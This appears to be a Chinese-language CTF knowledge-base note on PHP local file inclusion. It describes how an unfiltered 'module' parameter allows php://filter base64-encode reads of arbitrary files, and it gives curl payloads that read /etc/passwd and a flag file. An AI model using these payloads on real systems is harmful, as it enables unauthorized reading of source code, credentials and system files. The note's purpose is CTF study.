---
title: PHP 文件包含 — php://filter 任意文件读取
category: web
tags: [php, file-inclusion, lfi, php-filter, base64]
triggers: [文件包含, php://filter, include, require, LFI, module参数, /etc/passwd, base64-encode]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/web/PHP文件包含任意文件读取.md]
---

## Summary

`?module=` 参数未过滤直接拼接 `require/include`，通过 `php://filter/convert.base64-encode/resource=` 读取任意文件。

## Key Points

- 直接读取 PHP 文件会被解析，需要 Base64 编码输出
- 先用 `/etc/passwd` 测试漏洞存在性
- php://filter 是 PHP 文件读取的万能工具，无需文件上传

## Details

### 核心命令

```bash
# 测试漏洞
curl 'http://target/?module=php://filter/convert.base64-encode/resource=/etc/passwd'
# 读取 flag
curl 'http://target/?module=php://filter/convert.base64-encode/resource=/flag.txt'
# 解码
echo 'ZmxhZ3syM2FmY2UxZDhhZGIwZDA5YjlmYmI4YmQ4MTMyNGQ5Nn0K' | base64 -d
```

## Connections

- Related: [[php-deserialization-balance-tamper]]
- GHSA: [[web/ghsa-sqli-path-traversal]]